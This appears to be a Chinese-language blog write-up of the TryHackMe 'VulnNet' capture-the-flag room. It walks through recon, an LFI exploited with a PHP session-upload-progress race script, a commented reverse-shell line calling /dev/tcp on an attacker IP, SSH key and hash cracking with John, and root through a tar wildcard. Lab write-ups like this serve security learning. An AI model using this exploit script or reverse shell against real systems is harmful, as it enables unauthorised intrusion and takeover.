---
title: VulnNet (Try Hack Me Writeup)
date: 2021-08-23T13:28:00+08:00
draft: false
url: "/2021/08/23/vulnnet-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

> 
URL : https://tryhackme.com/room/vulnnet1  
IP : 10.10.86.144

- 題目敘述`You will have to add a machine IP with domain vulnnet.thm to your /etc/hosts`

## Recon

- 掃 Port`rustscan -a 10.10.86.144 -r 1-65535`![](/uploads/2022/02/2a603-vIQriUD.png)`nmap -A -p22,80 10.10.86.144`- ![](/uploads/2022/02/562ca-8iyHObG.png)掃目錄- `python3 dirsearch.py -u http://10.10.86.144/`![](/uploads/2022/02/9308d-qURY7kW.png)
- ![](/uploads/2022/02/5c374-vphYlEc.png)發現登入頁面- ![](/uploads/2022/02/98e78-lOR56fr.png)
- 戳了常見的 SQLi 都不行觀察網頁連結- ![](/uploads/2022/02/877c6-UtPIr0V.png)透過 js formatter 轉漂亮![](/uploads/2022/02/88009-rjfcVqd.png)- `broadcast.vulnnet.thm`
- 加到 `/etc/hosts`前面的階段也可以用 `LinkFinder`- `python3 linkfinder.py -i http://vulnnet.thm/`![](/uploads/2022/02/1ee05-oWZvBQs.png)`python3 linkfinder.py -i http://vulnnet.thm/js/index__d8338055.js`- ![](/uploads/2022/02/74eca-JlJlqLz.png)
- ![](/uploads/2022/02/7116c-nJFz81A.png)發現首頁可以帶一個 `?referer` 參數訪問 `broadcast.vulnnet.thm`- ![](/uploads/2022/02/4b286-VHfgLFt.png)
- 發現需要登入觀察首頁 `referer` 參數- 發現可以 LFI![](/uploads/2022/02/cabf3-WKOWvWA.png)用 Session upload progress 大法

```
import grequests
sess_name = 'meowmeow'
sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
base_url = 'http://vulnnet.thm/index.php'
param = "referer"

#code = "file_put_contents('/tmp/shell.php','& /dev/tcp/10.13.21.55/7877 0>&1'");'''

while True:
    req = [grequests.post(base_url,
                            files={'f': "A"*0xffff},
                            data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:"},
                            cookies={'PHPSESSID': sess_name}),
            grequests.get(f"{base_url}?{param}={sess_path}")]

    result = grequests.map(req)
    if "pwned" in result[1].text:
        print(result[1].text)
        break
```

- 然後就 RCE 了![](/uploads/2022/02/a1fdf-Nw726OE.png)
- (感覺就不是正規解…ㄏㄏ

## 提權

- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- 掃豌豆![](/uploads/2022/02/65cb3-XZOpfXC.png)
- 找到 backup![](/uploads/2022/02/6240f-KBMz0OO.png)觀察 backup 檔案，發現有 ssh-backup- ![](/uploads/2022/02/e5582-so7QneR.png)
- 偷出來解壓縮- ![](/uploads/2022/02/610d9-jsXBiUr.png)
- 發現是 `id_rsa`![](/uploads/2022/02/51aef-0P706uh.png)到家目錄看使用者名稱- ![](/uploads/2022/02/a890d-v2l4V0H.png)
- `server-management`發現是 `server-management`準備 ssh 登入- ![](/uploads/2022/02/d02d9-qRY1yQi.png)
- 發現 `id_rsa` 需要密碼 QQ用約翰爆破- `python3 ../../ssh2john.py id_rsa > id_rsa_john`
- ![](/uploads/2022/02/6b9be-Wd6L7hB.png)
- 密碼是 `oneTWO3gOyac`SSH 登入- ![](/uploads/2022/02/ceed6-78Hekqp.png)
- 取得 user flag跑豌豆掃到 `.htpasswd` 密碼的 hash- 猜測應該是給 `broadcast.vulnnet.thm` 用的
- ![](/uploads/2022/02/47aa5-cGflEXG.png)
- 用約翰爆破個![](/uploads/2022/02/4ae0f-g5fTfFi.png)
- 密碼是 ``9972761drmfsls`猜測原始思路正規解法應該是 LFI 到這個檔案訪問 broadcast.vulnnet.thm- 使用帳號 `developers`![](/uploads/2022/02/7cb34-jR4k1zC.png)密碼 `9972761drmfsls`![](/uploads/2022/02/c5964-Hp0c1Il.png)- 推測這應該是某個有 RCE 洞的 CMS
- 正規解是從這邊進 RCE ㄅ
- 隨便

## 二次提權

- 想起前面的 Backup 用了 `tar *`所以可以快速提權
- ![](/uploads/2022/02/592b6-gE5YL0d.png)接 Shell- ![](/uploads/2022/02/49aa9-hXx86b5.png)取 Root Flag- ![](/uploads/2022/02/becd4-XSutGiW.png)
